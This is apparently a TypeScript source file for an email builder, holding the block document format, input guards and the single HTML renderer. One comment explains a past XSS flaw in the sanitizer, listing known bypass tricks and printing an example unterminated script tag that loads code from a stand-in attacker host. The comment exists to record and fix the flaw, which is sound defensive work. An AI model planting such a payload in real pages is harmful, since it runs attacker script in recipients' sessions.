// src/lib/mail-product/blocks.ts — the email builder's document format, and the ONE renderer that
// turns it into HTML.
//
// ONE RENDERER, NOT TWO. The builder canvas, the desktop/mobile/HTML previews and the bytes that
// actually leave all come from renderDocument() below. The browser does not own a second copy of
// this logic — /api/mail/product/render posts the document here and renders the same function. A
// preview produced by different code from the send is a preview of nothing, and this project has
// already shipped one screen that "reported success" while doing something else.
//
// TABLE LAYOUT, INLINE STYLES, ON PURPOSE. This is not a web page. Desktop Outlook renders through
// Word, which has no flexbox, no grid, no float reliability, and strips <style> in several
// configurations. So: nested <table>, inline style attributes, no shorthand background, explicit
// widths, and every image given width/height so a blocked image still holds its space.
//
// NO EMOJI ANYWHERE, including in default block content — house rule (CLAUDE.md), and mail clients
// render them inconsistently across platforms in any case.
//
// PURE. No database, no network, no clock. Every function here is a value in, string out — which is
// what makes blocks.test.ts able to assert on the actual bytes.
import { esc, htmlToText } from './common';
// The HTML allow-list itself lives in mailsec, because the mail reading pane, the campaign renderer
// and the outbound composer must not each carry their own idea of what is safe. See sanitizeHtml().
import { sanitizeEmailHtmlString, ISOLATED } from '@/lib/mailsec/html';

export type BlockKind =
  | 'heading' | 'text' | 'image' | 'button' | 'divider' | 'spacer'
  | 'columns' | 'social' | 'quote' | 'html' | 'footer' | 'signature';

/** Every property the inspector can set. All optional — a block with none renders at the defaults. */
export interface BlockStyle {
  fontFamily?: string;
  fontSize?: number;
  fontWeight?: number | string;
  lineHeight?: number;
  color?: string;
  background?: string;
  align?: 'left' | 'center' | 'right';
  paddingTop?: number;
  paddingRight?: number;
  paddingBottom?: number;
  paddingLeft?: number;
  borderWidth?: number;
  borderColor?: string;
  borderRadius?: number;
  letterSpacing?: number;
}

export interface Block {
  id: string;
  kind: BlockKind;
  /** Rich text / heading text / raw HTML, depending on kind. */
  content?: string;
  style?: BlockStyle;
  /** button */
  href?: string;
  label?: string;
  /** image */
  src?: string;
  alt?: string;
  width?: number;
  /** spacer / divider */
  height?: number;
  /** columns — each column is its own block list, so the format nests without a second schema. */
  columns?: Block[][];
  /** social — the network name is a LABEL, never a brand asset; see the note in renderSocial(). */
  links?: { label: string; href: string }[];
}

/** Page-level settings the inspector edits when nothing is selected. */
export interface DocumentSettings {
  background?: string;
  contentBackground?: string;
  width?: number;
  fontFamily?: string;
  textColor?: string;
  linkColor?: string;
  preheader?: string;
}

export interface EmailDocument {
  version: 1;
  settings?: DocumentSettings;
  blocks: Block[];
}

// A font stack an email client will actually have. Web fonts are not loaded: Outlook ignores @font-face
// and Gmail strips the link, so a "custom font" is a fallback nobody chose.
export const FONT_STACKS: { label: string; value: string }[] = [
  { label: 'System sans', value: "-apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Arial, sans-serif" },
  { label: 'Arial', value: "Arial, Helvetica, sans-serif" },
  { label: 'Helvetica', value: "Helvetica, Arial, sans-serif" },
  { label: 'Georgia', value: "Georgia, 'Times New Roman', serif" },
  { label: 'Times', value: "'Times New Roman', Times, serif" },
  { label: 'Trebuchet', value: "'Trebuchet MS', Tahoma, sans-serif" },
  { label: 'Verdana', value: "Verdana, Geneva, sans-serif" },
  { label: 'Courier', value: "'Courier New', Courier, monospace" },
];

const DEFAULTS: Required<DocumentSettings> = {
  background: '#F1F4F8',
  contentBackground: '#FFFFFF',
  width: 600,
  fontFamily: FONT_STACKS[0].value,
  textColor: '#1E293B',
  linkColor: '#DC4500',
  preheader: '',
};

let seq = 0;
/** Ids are only unique WITHIN a document; the builder rewrites them on paste. */
export function blockId(prefix = 'b'): string {
  seq = (seq + 1) % 1e6;
  return `${prefix}${Date.now().toString(36)}${seq.toString(36)}`;
}

/** The starting document for a new template or campaign. Deliberately small — an author should be
 *  deleting less than they are adding. */
export function emptyDocument(): EmailDocument {
  return {
    version: 1,
    settings: { ...DEFAULTS },
    blocks: [
      { id: blockId(), kind: 'heading', content: 'A clear, specific subject line', style: { fontSize: 26, align: 'left' } },
      {
        id: blockId(), kind: 'text',
        content: 'Hello {{first_name}},<br><br>Write the one thing this message is for. Keep it to a few lines — the reader is deciding whether to act, not to read.',
        style: {},
      },
      { id: blockId(), kind: 'button', label: 'Open', href: 'https://edurankai.in', style: { align: 'left' } },
      { id: blockId(), kind: 'divider', style: {} },
      { id: blockId(), kind: 'footer', content: 'EduRankAI — the technology platform.', style: {} },
    ],
  };
}

// ---- Value guards ------------------------------------------------------------------------------
//
// Everything below is authored in a browser and stored as jsonb, so nothing may be trusted to be the
// type it claims. A number that arrives as "24px" or as NaN must not reach a style attribute.

function px(v: unknown, dflt: number, min = 0, max = 400): number {
  const n = Number(v);
  if (!Number.isFinite(n)) return dflt;
  return Math.round(Math.min(max, Math.max(min, n)));
}

const HEX_RE = /^#(?:[0-9a-f]{3}|[0-9a-f]{6}|[0-9a-f]{8})$/i;
const RGB_RE = /^rgba?\(\s*\d{1,3}\s*,\s*\d{1,3}\s*,\s*\d{1,3}\s*(?:,\s*(?:0|1|0?\.\d+)\s*)?\)$/i;
/** Colours are whitelisted, not escaped: a style attribute is an injection surface and `expression()`
 *  is still honoured by some mail renderers. Anything unrecognised falls back rather than passing. */
function colour(v: unknown, dflt: string): string {
  const s = String(v ?? '').trim();
  if (HEX_RE.test(s) || RGB_RE.test(s)) return s;
  if (/^[a-z]{3,20}$/i.test(s)) return s.toLowerCase(); // named CSS colours
  return dflt;
}

function align(v: unknown): 'left' | 'center' | 'right' {
  return v === 'center' || v === 'right' ? v : 'left';
}

function fontStack(v: unknown, dflt: string): string {
  const s = String(v ?? '').trim();
  // Font stacks are quoted into a style attribute; anything with a brace, semicolon or angle bracket
  // is not a font stack.
  if (!s || /[<>{};]/.test(s)) return dflt;
  return s.slice(0, 200);
}

/**
 * A link that is safe to put in an href.
 *
 * http/https/mailto/tel only. `javascript:` and `data:` are refused outright — a template is authored
 * by one person and rendered in another person's mail client, and a stored link is a stored payload.
 * A refused URL becomes '#', which is visibly broken rather than quietly dangerous.
 */
export function safeHref(v: unknown): string {
  const s = String(v ?? '').trim();
  if (!s) return '#';
  if (/^(https?:|mailto:|tel:)/i.test(s)) return s.slice(0, 2000);
  // A bare domain typed by an author is the common case and is not an attack.
  if (/^[\w-]+(\.[\w-]+)+(\/|$)/.test(s)) return 'https://' + s.slice(0, 2000);
  return '#';
}

/** Same rule for images, minus mailto/tel. data: is refused: it bloats the message and is stripped. */
export function safeSrc(v: unknown): string {
  const s = String(v ?? '').trim();
  return /^https?:\/\//i.test(s) ? s.slice(0, 2000) : '';
}

/**
 * The subset of HTML an author may write inside a text block or an HTML block used to be declared
 * here, as ALLOWED_TAGS and ALLOWED_ATTRS.
 *
 * It now lives in src/lib/mailsec/html.ts, unchanged, and this file reads it through sanitizeHtml()
 * below. TWO COPIES OF AN ALLOW-LIST IS ONE COPY TOO MANY: the mail reading pane, the campaign
 * renderer and the outbound composer all sanitise, and a tag added to one list and not the other is
 * a difference nobody discovers until a message renders differently in two places.
 */

/**
 * THIS NOW DELEGATES, AND THE REASON IS WORTH THE PARAGRAPH.
 *
 * The implementation that used to live here was a good allow-list — event handlers dropped by
 * construction, `javascript:` and `data:` hrefs refused, and it survived every classic bypass it was
 * tested against: mXSS through <math>/<mglyph>, the <noscript> title breakout, unquoted and
 * slash-separated attributes, entity-encoded schemes, `<scr<script>ipt>`.
 *
 * It had ONE assumption, shared by every regex in it: that a tag ends with `>`. A tag that never
 * closes matched nothing and was copied to the output byte for byte —
 *
 *     in : hello <script src="https://attacker.example/x.js"
 *     out: hello <script src="https://attacker.example/x.js"
 *
 * — and that string is only harmless until it is inserted with `set:html`, at which point the
 * browser keeps parsing INTO THE SURROUNDING PAGE and the application's own next `>` closes the tag
 * for it. src/pages/mail/box/[folder].astro renders every internal message that way, and
 * /api/mail/send accepts `bodyHtml` from any mailbox holder and stores it with direction
 * 'internal' — so the whole distance from "an intern can send mail" to "script runs in the
 * recipient's session" was this one missing bracket. There is no CSP on this deployment to catch it.
 *
 * src/lib/mailsec/html.ts rebuilds the document instead of cleaning it: every `<` either begins a
 * complete, allow-listed tag that it re-emits, or becomes `&lt;`. There is no third branch, so the
 * unterminated case cannot exist. The allow-lists moved there unchanged, so what a template is
 * permitted to contain is exactly what it was permitted to contain yesterday.
 *
 * ISOLATED, not ORIGIN: this function's other callers are the block renderers, whose output goes
 * into an EMAIL. Restricting `position:` there would silently change how existing templates lay out.
 * The strict profile is applied at the surface that renders into our own origin, which is where the
 * layout question actually matters.
 */
export function sanitizeHtml(input: unknown): string {
  return sanitizeEmailHtmlString(input, ISOLATED);
}

// ---- Rendering ---------------------------------------------------------------------------------

function padding(s: BlockStyle | undefined, dflt: [number, number, number, number]): string {
  const t = px(s?.paddingTop, dflt[0]);
  const r = px(s?.paddingRight, dflt[1]);
  const b = px(s?.paddingBottom, dflt[2]);
  const l = px(s?.paddingLeft, dflt[3]);
  return `${t}px ${r}px ${b}px ${l}px`;
}

function typeStyle(s: BlockStyle | undefined, doc: Required<DocumentSettings>, size: number, weight: number | string): string {
  const bits = [
    `font-family:${fontStack(s?.fontFamily, doc.fontFamily)}`,
    `font-size:${px(s?.fontSize, size, 8, 96)}px`,
    `font-weight:${/^[0-9]{3}$|^(normal|bold)$/.test(String(s?.fontWeight ?? '')) ? s!.fontWeight : weight}`,
    `line-height:${Number.isFinite(Number(s?.lineHeight)) ? Math.min(3, Math.max(0.9, Number(s!.lineHeight))) : 1.55}`,
    `color:${colour(s?.color, doc.textColor)}`,
    `text-align:${align(s?.align)}`,
  ];
  const ls = Number(s?.letterSpacing);
  if (Number.isFinite(ls) && ls !== 0) bits.push(`letter-spacing:${Math.min(6, Math.max(-2, ls))}px`);
  return bits.join(';');
}

function cellOpen(s: BlockStyle | undefined, doc: Required<DocumentSettings>, dfltPad: [number, number, number, number]): string {
  const bg = s?.background ? `background-color:${colour(s.background, 'transparent')};` : '';
  const bw = px(s?.borderWidth, 0, 0, 20);
  const border = bw ? `border:${bw}px solid ${colour(s?.borderColor, '#E3E8EF')};` : '';
  const radius = px(s?.borderRadius, 0, 0, 60);
  const br = radius ? `border-radius:${radius}px;` : '';
  return `<td style="padding:${padding(s, dfltPad)};${bg}${border}${br}">`;
}

function renderHeading(b: Block, doc: Required<DocumentSettings>): string {
  const level = px(b.height, 1, 1, 4); // reuse: heading level lives on `height` in the document
  const size = [30, 24, 19, 16][level - 1];
  return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<h${level} style="margin:0;${typeStyle(b.style, doc, size, 700)}">${sanitizeHtml(b.content)}</h${level}></td>`;
}

function renderText(b: Block, doc: Required<DocumentSettings>): string {
  return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="margin:0;${typeStyle(b.style, doc, 15, 400)}">${sanitizeHtml(b.content)}</div></td>`;
}

function renderImage(b: Block, doc: Required<DocumentSettings>): string {
  const src = safeSrc(b.src);
  const a = align(b.style?.align);
  // A blocked image must still hold its place and still say what it was: alt text is not optional in
  // email, where images are off by default in a large share of clients.
  const alt = esc(b.alt || '');
  if (!src) {
    return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="border:1px dashed #CFD8E3;border-radius:8px;padding:28px;text-align:center;font-family:${doc.fontFamily};font-size:13px;color:#7C8AA0">No image set</div></td>`;
  }
  const w = px(b.width, doc.width - 48, 20, 1200);
  const radius = px(b.style?.borderRadius, 0, 0, 60);
  const img = `<img src="${esc(src)}" alt="${alt}" width="${w}" style="display:block;width:100%;max-width:${w}px;height:auto;border:0;outline:none;text-decoration:none;${radius ? `border-radius:${radius}px;` : ''}" />`;
  const wrapped = b.href ? `<a href="${esc(safeHref(b.href))}" target="_blank" rel="noopener noreferrer" style="text-decoration:none">${img}</a>` : img;
  return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="text-align:${a}">${wrapped}</div></td>`;
}

function renderButton(b: Block, doc: Required<DocumentSettings>): string {
  const bg = colour(b.style?.background, '#FF4F00');
  const fg = colour(b.style?.color, '#FFFFFF');
  const radius = px(b.style?.borderRadius, 6, 0, 40);
  const size = px(b.style?.fontSize, 15, 10, 32);
  const font = fontStack(b.style?.fontFamily, doc.fontFamily);
  // A nested table rather than a padded <a>: Outlook drops padding on inline elements, so a styled
  // link renders as bare blue text with no button around it.
  return `${cellOpen(b.style, doc, [12, 24, 12, 24])}
        <table role="presentation" cellpadding="0" cellspacing="0" border="0" style="margin:0 ${align(b.style?.align) === 'center' ? 'auto' : align(b.style?.align) === 'right' ? '0 0 auto' : '0'}">
          <tr><td style="background-color:${bg};border-radius:${radius}px" align="center">
            <a href="${esc(safeHref(b.href))}" target="_blank" rel="noopener noreferrer" style="display:inline-block;padding:12px 26px;font-family:${font};font-size:${size}px;font-weight:600;color:${fg};text-decoration:none;border-radius:${radius}px">${esc(b.label || 'Open')}</a>
          </td></tr>
        </table></td>`;
}

function renderDivider(b: Block, doc: Required<DocumentSettings>): string {
  const c = colour(b.style?.borderColor, '#E3E8EF');
  const w = px(b.style?.borderWidth, 1, 1, 8);
  return `${cellOpen(b.style, doc, [10, 24, 10, 24])}<div style="border-top:${w}px solid ${c};font-size:0;line-height:0">&nbsp;</div></td>`;
}

function renderSpacer(b: Block, doc: Required<DocumentSettings>): string {
  const h = px(b.height, 24, 2, 200);
  return `<td style="padding:0"><div style="height:${h}px;font-size:0;line-height:0">&nbsp;</div></td>`;
}

function renderQuote(b: Block, doc: Required<DocumentSettings>): string {
  const bar = colour(b.style?.borderColor, '#FF4F00');
  return `${cellOpen(b.style, doc, [8, 24, 8, 24])}
        <div style="border-left:3px solid ${bar};padding:2px 0 2px 16px;margin:0;${typeStyle(b.style, doc, 16, 400)}">${sanitizeHtml(b.content)}</div></td>`;
}

function renderHtmlBlock(b: Block, doc: Required<DocumentSettings>): string {
  // Sanitised like every other authored string. "Raw HTML" is a block for tables and inline styles a
  // builder cannot express — it is not an escape hatch out of the allow-list.
  return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="${typeStyle(b.style, doc, 15, 400)}">${sanitizeHtml(b.content)}</div></td>`;
}

function renderSocial(b: Block, doc: Required<DocumentSettings>): string {
  // TEXT LABELS, NOT LOGOS. A brand logo in an email is that company's trademark on our message, it
  // needs a remotely-hosted asset that half of clients block anyway, and this product's rules forbid
  // naming or badging other companies in user-facing copy. The author types the label they want.
  const links = (b.links || []).filter((l) => l && l.label);
  if (!links.length) return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="${typeStyle(b.style, doc, 13, 500)}">No links added</div></td>`;
  const inner = links.map((l) =>
    `<a href="${esc(safeHref(l.href))}" target="_blank" rel="noopener noreferrer" style="color:${colour(b.style?.color, doc.linkColor)};text-decoration:none;font-weight:600;padding:0 8px">${esc(String(l.label).slice(0, 40))}</a>`
  ).join('<span style="color:#CFD8E3">·</span>');
  return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="${typeStyle(b.style, doc, 13, 500)}">${inner}</div></td>`;
}

function renderFooter(b: Block, doc: Required<DocumentSettings>): string {
  const s: BlockStyle = { fontSize: 12, color: '#7C8AA0', align: 'center', ...(b.style || {}) };
  // The unsubscribe token is appended if the author has not placed it, because a bulk message without
  // a working opt-out is the thing that gets a sending domain blocked.
  const body = sanitizeHtml(b.content || '');
  const hasUnsub = /\{\{\s*unsubscribe_url\s*\}\}/.test(body);
  const unsub = hasUnsub ? '' :
    `<br /><a href="{{unsubscribe_url}}" style="color:${colour(s.color, '#7C8AA0')};text-decoration:underline">Unsubscribe from these messages</a>`;
  return `${cellOpen(s, doc, [16, 24, 20, 24])}<div style="${typeStyle(s, doc, 12, 400)}">${body}${unsub}</div></td>`;
}

function renderSignature(b: Block, doc: Required<DocumentSettings>): string {
  return `${cellOpen(b.style, doc, [12, 24, 12, 24])}
        <div style="border-top:1px solid #E3E8EF;padding-top:12px;${typeStyle(b.style, doc, 13, 400)}">${sanitizeHtml(b.content)}</div></td>`;
}

function renderColumns(b: Block, doc: Required<DocumentSettings>): string {
  const cols = (b.columns || []).slice(0, 4);
  if (!cols.length) return `${cellOpen(b.style, doc, [8, 24, 8, 24])}<div style="${typeStyle(b.style, doc, 13, 400)}">No columns</div></td>`;
  const pct = Math.floor(100 / cols.length);
  // The stack-on-mobile trick that works without media queries in Outlook: each column is an
  // inline-block with a max-width, inside a table that Outlook reads as fixed-width columns via the
  // conditional comment. Gmail and Apple Mail honour the inline-block and wrap naturally.
  const inner = cols.map((col) => `
          <div style="display:inline-block;width:100%;max-width:${Math.floor((doc.width - 48) / cols.length)}px;vertical-align:top">
            <table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%">
              ${col.map((child) => `<tr>${renderBlock(child, doc)}</tr>`).join('')}
            </table>
          </div>`).join('');
  return `${cellOpen(b.style, doc, [4, 12, 4, 12])}
        <!--[if mso]><table role="presentation" width="100%"><tr>${cols.map(() => `<td width="${pct}%" valign="top">`).join('')}<![endif]-->
        <div style="font-size:0;text-align:${align(b.style?.align) === 'left' ? 'left' : 'center'}">${inner}</div>
        <!--[if mso]>${cols.map(() => '</td>').join('')}</tr></table><![endif]--></td>`;
}

/** One block as a single <td>. Always a td: the caller wraps it in a <tr>. */
export function renderBlock(b: Block, doc: Required<DocumentSettings>): string {
  switch (b?.kind) {
    case 'heading': return renderHeading(b, doc);
    case 'text': return renderText(b, doc);
    case 'image': return renderImage(b, doc);
    case 'button': return renderButton(b, doc);
    case 'divider': return renderDivider(b, doc);
    case 'spacer': return renderSpacer(b, doc);
    case 'columns': return renderColumns(b, doc);
    case 'social': return renderSocial(b, doc);
    case 'quote': return renderQuote(b, doc);
    case 'html': return renderHtmlBlock(b, doc);
    case 'footer': return renderFooter(b, doc);
    case 'signature': return renderSignature(b, doc);
    // An unknown kind is a document from a newer builder. Render nothing rather than throwing —
    // one bad block must not blank an entire campaign preview.
    default: return '<td style="padding:0"></td>';
  }
}

export interface RenderResult { html: string; text: string; }

/**
 * The whole document as a standalone email.
 *
 * `inline` renders only the content table (no <html>/<head>) — that is what the builder canvas shows,
 * so the canvas is the same renderer and not a lookalike.
 */
export function renderDocument(input: EmailDocument | null | undefined, opts: { inline?: boolean } = {}): RenderResult {
  const doc: Required<DocumentSettings> = { ...DEFAULTS, ...(input?.settings || {}) } as Required<DocumentSettings>;
  doc.width = px(doc.width, 600, 320, 900);
  doc.background = colour(doc.background, DEFAULTS.background);
  doc.contentBackground = colour(doc.contentBackground, DEFAULTS.contentBackground);
  doc.textColor = colour(doc.textColor, DEFAULTS.textColor);
  doc.linkColor = colour(doc.linkColor, DEFAULTS.linkColor);
  doc.fontFamily = fontStack(doc.fontFamily, DEFAULTS.fontFamily);

  const blocks = Array.isArray(input?.blocks) ? input!.blocks : [];
  const rows = blocks.map((b) => `<tr>${renderBlock(b, doc)}</tr>`).join('\n      ');

  const content = `<table role="presentation" cellpadding="0" cellspacing="0" border="0" width="${doc.width}" style="width:100%;max-width:${doc.width}px;background-color:${doc.contentBackground};border-radius:8px" class="em-content">
      ${rows}
    </table>`;

  if (opts.inline) return { html: content, text: htmlToText(content) };

  // The preheader is the grey line the inbox shows beside the subject. Hidden in the body and padded
  // with a zero-width space run, which is the only reliable way to stop the client from filling the
  // rest of the preview with the first words of the message.
  const pre = doc.preheader
    ? `<div style="display:none;max-height:0;overflow:hidden;mso-hide:all">${esc(doc.preheader)}${'&#8203;&nbsp;'.repeat(60)}</div>`
    : '';

  const html = `<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" lang="en">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1" />
<meta name="x-apple-disable-message-reformatting" />
<title></title>
<!--[if mso]><style>table,td,div,p,a{font-family:Arial,sans-serif !important}</style><![endif]-->
<style>
  body{margin:0;padding:0;width:100% !important;background-color:${doc.background}}
  img{border:0;line-height:100%;outline:none;text-decoration:none;-ms-interpolation-mode:bicubic}
  a{color:${doc.linkColor}}
  @media only screen and (max-width:600px){
    .em-content{width:100% !important}
    .em-content td{padding-left:16px !important;padding-right:16px !important}
  }
</style>
</head>
<body style="margin:0;padding:0;background-color:${doc.background}">
${pre}
<table role="presentation" cellpadding="0" cellspacing="0" border="0" width="100%" style="background-color:${doc.background}">
  <tr><td align="center" style="padding:24px 12px">
    ${content}
  </td></tr>
</table>
</body>
</html>`;

  return { html, text: htmlToText(content) };
}

/** Every merge token used anywhere in the document — what the preview screen warns about. */
export function documentVariables(input: EmailDocument | null | undefined): string[] {
  const out = new Set<string>();
  const walk = (bs: Block[]) => {
    for (const b of bs || []) {
      for (const s of [b.content, b.label, b.href, b.alt, b.src]) {
        for (const m of String(s || '').matchAll(/\{\{\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\}\}/g)) out.add(m[1]);
      }
      for (const l of b.links || []) {
        for (const m of String(l.label + ' ' + l.href).matchAll(/\{\{\s*([a-zA-Z_][a-zA-Z0-9_]*)\s*\}\}/g)) out.add(m[1]);
      }
      for (const col of b.columns || []) walk(col);
    }
  };
  walk(Array.isArray(input?.blocks) ? input!.blocks : []);
  return [...out];
}

/**
 * Accept a document that came out of jsonb / a POST body.
 *
 * Anything that is not the shape above becomes an empty document rather than throwing: a campaign
 * whose blocks column holds something unexpected must still open in the builder so somebody can fix
 * it, not 500 on the way to the screen that would let them.
 */
export function coerceDocument(raw: unknown): EmailDocument {
  if (!raw || typeof raw !== 'object') return { version: 1, settings: { ...DEFAULTS }, blocks: [] };
  const o = raw as any;
  const blocks = Array.isArray(o.blocks) ? o.blocks.filter((b: any) => b && typeof b === 'object' && typeof b.kind === 'string') : [];
  return {
    version: 1,
    settings: (o.settings && typeof o.settings === 'object') ? o.settings : { ...DEFAULTS },
    blocks: blocks.slice(0, 400),
  };
}
